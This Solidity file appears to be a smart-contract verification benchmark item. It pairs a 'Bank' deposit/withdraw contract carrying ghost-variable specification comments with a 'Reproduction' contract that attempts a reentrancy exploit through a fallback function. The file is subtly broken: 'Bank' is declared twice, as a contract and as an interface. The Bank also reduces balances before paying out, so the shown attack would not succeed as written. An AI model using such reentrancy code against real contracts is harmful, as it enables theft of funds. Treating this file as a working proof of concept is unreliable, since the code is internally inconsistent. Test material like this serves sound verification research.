//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
/// @custom:version conformant to specification
contract Bank {
    mapping (address => uint) balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        /// @custom:preghost function withdraw
        uint old_contract_balance = address(this).balance;
        require(amount > 0);
        require(amount <= balances[msg.sender]);

        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        /// @custom:postghost function withdraw
        uint new_contract_balance = address(this).balance;
        assert(new_contract_balance == old_contract_balance - amount);
    }
}

contract Reproduction {
    Bank target;
    bool reentrancyTriggered;

    constructor(address _target) {
        target = Bank(_target);
        reentrancyTriggered = false;
    }

    function exploit() public payable {
        require(msg.value > 0, "Must send ETH to exploit");

        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    fallback() external payable {
        if (!reentrancyTriggered) {
            reentrancyTriggered = true;
            target.withdraw(msg.value);
        }
    }
}

interface Bank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}